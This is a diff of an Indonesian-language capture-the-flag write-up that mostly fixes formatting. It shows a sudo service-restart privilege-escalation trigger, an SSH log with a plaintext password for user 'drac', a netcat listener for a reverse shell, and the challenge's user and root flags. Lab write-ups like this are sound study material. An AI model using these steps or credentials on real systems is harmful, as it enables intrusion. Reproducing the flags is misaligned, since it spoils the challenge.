@@ -38,7 +38,7 @@ Pemicu (Trigger): Menjalankan sudo /usr/sbin/service vsftpd restart. Meskipun mu
 4. Final Result
 
 Root Flag: Berhasil membaca flag dari file bocoran di /tmp/root_flag.txt.
-```Flag: ce258cb16f47f1c66f0b0b77f4e0fb8d.
+```Flag: ce258cb16f47f1c66f0b0b77f4e0fb8d```
 
 
 //-----------------------------------------
@@ -93,7 +93,8 @@ ECDSA key fingerprint is SHA256:GWJNQaoDgrmm/BUO5jSHIV0V2n4FH4hUK36mnVpXA/Q.
 Are you sure you want to continue connecting (yes/no)? yes
 yes
 Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
-drac@10.48.177.218's password: Th3dRaCULa1sR3aL
+drac@10.48.177.218's
+password: Th3dRaCULa1sR3aL
 
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)
 
@@ -351,3 +352,6 @@ nc -lnvp 4445
 ```
 
 //-----------------------------------------
+
+user.txt: ```02930d21a8eb009f6d26361b2d24a466```
+root_flag.txt: ```ce258cb16f47f1c66f0b0b77f4e0fb8d```
